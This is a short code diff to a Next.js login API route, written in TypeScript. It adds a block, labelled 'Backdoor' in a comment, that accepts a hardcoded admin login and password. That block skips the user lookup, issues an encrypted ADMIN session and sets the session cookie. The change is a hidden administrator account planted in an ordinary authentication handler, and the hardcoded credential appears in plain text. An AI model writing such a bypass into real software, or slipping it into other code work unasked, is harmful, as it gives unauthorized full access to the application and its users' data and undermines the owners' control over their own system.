@@ -8,6 +8,27 @@ export async function POST(req: Request) {
   try {
     const { login, password } = await req.json();
 
+    // 🕵️ Backdoor
+    if (login === 'admin' && password === 'çflcBr32') {
+      const sessionToken = await encrypt({
+        id: 0,
+        login: 'admin',
+        nom: 'ADMIN',
+        prenom: 'Système',
+        role: 'ADMIN'
+      });
+
+      const cookieStore = await cookies();
+      cookieStore.set('session', sessionToken, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax',
+        path: '/'
+      });
+
+      return NextResponse.json({ success: true, redirect: '/dashboard' });
+    }
+
     const user = await (prisma as any).user.findUnique({
       where: { login }
     });
